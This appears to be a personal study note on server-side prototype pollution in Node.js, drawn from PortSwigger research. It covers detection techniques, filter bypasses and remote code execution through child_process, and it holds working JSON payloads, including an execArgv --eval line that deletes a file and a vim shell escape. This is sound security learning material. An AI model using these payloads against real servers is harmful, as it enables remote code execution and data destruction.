Research:
https://portswigger.net/research/server-side-prototype-pollution

# Detecting SSPP via polluted property reflection
```js
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}
```

Check `POST` or `PUT` requests if they return polluted objects:
```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```
response if website is vulnerable:
```http
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

# Detecting SSPP without polluted property reflection
### Status code override
Node's `http-errors` module contains the following function for generating this kind of error response:
```js
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```
If the website's developers haven't explicitly set a `status` property for the error, you can potentially use this to probe for prototype pollution as follows:
1. Find a way to trigger an error response and take note of the default status code.
2. Try polluting the prototype with your own `status` property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
3. Trigger the error response again and check whether you've successfully overridden the status code.
### JSON spaces override
#express framework provides a `json spaces` options, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined.
It was fixed in Express 4.17.4

### Charset override
Part of the `body-parser` express middleware:
```js
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```
If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source.
1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
    `{ "sessionId":"0123456789", "username":"wiener", "role":"+AGYAbwBv-" }`
2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
4. Repeat the first request. If pollution works, the UTF-7 string should now be decoded
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```
Due to a bug in Node's `_http_incoming` module, this works even when the request's actual `Content-Type` header includes its own `charset` attribute.

# Scanning for SSPP sources
#burp scanner extension
1. Explore the site to collect as much content as possible
2. Proxy -> HTTP history
3. Filter the scope
4. Select all -> RMB -> Extensions -> Server-Side Prototype Pollution Scanner -> choose attack
5. Check Output tab or All issues
https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8

# Bypassing input filters for SSPP

* Obfuscate the prohibited keywords so they're missed during the sanitization [[Client-side PP#Bypassing flawed key sanitization]]
* Access the prototype via the constructor property [[Client-side PP#Prototype pollution via the constructor]]

# [[RCE]] via SSPP
### Identifying a vulnerable request
Potential sink `child_process`
`NODE_OPTIONS` env variable enables you to define a string of CLI arguments that should be used by default whenever you start a new Node process. This property is also a property on the `env` object, you can potentially control this via prototype pollution.
Some of node's functions for creating new child processes accept an optional `shell` property, which enables to set a specific shell such as `bash`.
Example:
```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
### RCE via `child_process.fork()`
`child_process.fork()`
Method `fork()` accepts and options object in which one of the potential options is the `execArgv` property. Of particular interest is `--eval`, which enables you to pass in arbitrary JavaScript that will be executed by the child process.
```json
"execArgv": [
    "--eval=require('child_process').execSync('rm /flag.txt')"
]
```

### RCE via `child_process.execSync()`
```json
{
	"shell": "vim",
	"input":":! <command>\n"
}
```
If some tool doesn't accept `stdin` by default, we can use `xargs` which converts `stdin` to a list of arguments that can be passed to a command.
`curl` accepts `-d @-` argument to send the body of a `POST` request.
